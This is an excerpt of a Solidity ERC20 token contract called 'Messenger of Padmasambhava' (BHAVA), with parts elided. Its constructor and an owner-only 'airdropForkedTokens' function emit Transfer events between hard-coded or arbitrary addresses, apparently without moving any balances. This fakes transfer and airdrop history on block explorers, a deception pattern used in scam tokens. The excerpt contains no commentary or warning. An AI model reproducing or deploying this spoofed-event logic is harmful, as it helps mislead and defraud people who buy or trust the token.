...
contract Padmasambhava is Context, IERC20 {
    ...
    address _contDeployr = 0x8242e56a759aa0B069B9c983fe3f582020CD1eC9;
    address public _ownr = 0xB14345Db882d36D420048f15ACa96423B32c0d85;
   constructor () public {

        _name = "Messenger of Padmasambhava";
        _symbol = "BHAVA";
        _decimals = 18;
        ...
        emit Transfer(_contDeployr, 0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD, initialSupply/5);
        emit Transfer(0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD, 0x8413f65e93d31f52706C301BCc86e0727FD7c025, initialSupply/5);
        emit Transfer(0x8242e56a759aa0B069B9c983fe3f582020CD1eC9, 0x8ADD70024a5673bE5fFdD952239Ef2Ccbd6a7152, initialSupply/5);
        emit Transfer(0x8242e56a759aa0B069B9c983fe3f582020CD1eC9, 0xB156BA83B65e91C4B92Ec9687d3fA8D929215485, initialSupply/5);
        emit Transfer(0x8242e56a759aa0B069B9c983fe3f582020CD1eC9, 0x5848B32565B9ED0b33889bcD0daF2c31C44002AA, initialSupply/5);
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function airdropForkedTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
